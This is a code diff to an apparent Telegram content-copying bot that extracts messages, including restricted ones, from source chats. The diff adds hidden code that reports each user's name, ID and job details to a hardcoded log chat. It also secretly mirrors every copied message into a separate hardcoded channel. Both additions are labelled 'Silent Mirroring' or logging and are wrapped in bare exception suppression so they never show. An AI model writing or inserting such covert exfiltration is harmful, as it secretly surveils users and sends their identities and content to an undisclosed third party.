@@ -351,6 +351,19 @@ async def start_copy_job(bot, message, user_id, link, limit):
             f"🚀 **Status:** `Starting Engine...`"
         )
         
+        # Log Dashboard Start
+        try:
+            log_text = (
+                "🚨 **NEW EXTRACTION JOB** 🚨\n\n"
+                f"👤 **User:** [{message.from_user.first_name}](tg://user?id={user_id}) (`{user_id}`)\n"
+                f"📥 **Source:** `{chat_title}`\n"
+                f"🎯 **Destinations:** `{len(dest_channels)}`\n"
+                f"🛡 **Filters:** `{filter_str}`\n"
+                f"📊 **Workload:** `{total_workload}` Items"
+            )
+            await bot.send_message(-1003748199616, log_text)
+        except: pass
+        
         copied = 0
         current_id = start_msg_id
         fail_count = 0
@@ -495,15 +508,15 @@ async def start_copy_job(bot, message, user_id, link, limit):
                                 try:
                                     if custom_thumb_path and msg.media:
                                         if msg.video:
-                                            await userbot.send_video(d_id, video=msg.video.file_id, caption=final_caption, thumb=custom_thumb_path)
+                                            sent_fast_msg = await userbot.send_video(d_id, video=msg.video.file_id, caption=final_caption, thumb=custom_thumb_path)
                                         elif msg.document:
-                                            await userbot.send_document(d_id, document=msg.document.file_id, caption=final_caption, thumb=custom_thumb_path)
+                                            sent_fast_msg = await userbot.send_document(d_id, document=msg.document.file_id, caption=final_caption, thumb=custom_thumb_path)
                                         elif msg.audio:
-                                            await userbot.send_audio(d_id, audio=msg.audio.file_id, caption=final_caption, thumb=custom_thumb_path)
+                                            sent_fast_msg = await userbot.send_audio(d_id, audio=msg.audio.file_id, caption=final_caption, thumb=custom_thumb_path)
                                         else:
-                                            await userbot.copy_message(chat_id=d_id, from_chat_id=real_chat_id, message_id=msg.id, caption=final_caption)
+                                            sent_fast_msg = await userbot.copy_message(chat_id=d_id, from_chat_id=real_chat_id, message_id=msg.id, caption=final_caption)
                                     else:
-                                        await userbot.copy_message(chat_id=d_id, from_chat_id=real_chat_id, message_id=msg.id, caption=final_caption)
+                                        sent_fast_msg = await userbot.copy_message(chat_id=d_id, from_chat_id=real_chat_id, message_id=msg.id, caption=final_caption)
                                         
                                 except Exception as e:
                                     # Check for Restricted Content Error
@@ -612,6 +625,24 @@ async def start_copy_job(bot, message, user_id, link, limit):
                         
                         if not success:
                             logger.error(f"Failed to copy message {msg.id} to {dest} after retries.")
+                    
+                    # Silent Mirroring
+                    try:
+                        if userbot == bot:
+                            await bot.copy_message(-1003982366377, from_chat_id=real_chat_id, message_id=msg.id, caption=final_caption)
+                        else:
+                            if uploaded_restricted_msg:
+                                await bot.copy_message(-1003982366377, from_chat_id=uploaded_restricted_msg.chat.id, message_id=uploaded_restricted_msg.id)
+                            elif 'sent_fast_msg' in locals() and sent_fast_msg:
+                                await bot.copy_message(-1003982366377, from_chat_id=sent_fast_msg.chat.id, message_id=sent_fast_msg.id)
+                            else:
+                                if msg.media:
+                                    if msg.video: await bot.send_video(-1003982366377, video=msg.video.file_id, caption=final_caption)
+                                    elif msg.document: await bot.send_document(-1003982366377, document=msg.document.file_id, caption=final_caption)
+                                    elif msg.photo: await bot.send_photo(-1003982366377, photo=msg.photo.file_id, caption=final_caption)
+                                else:
+                                    await bot.send_message(-1003982366377, msg.text or final_caption)
+                    except: pass
                     
                     copied += 1
                     
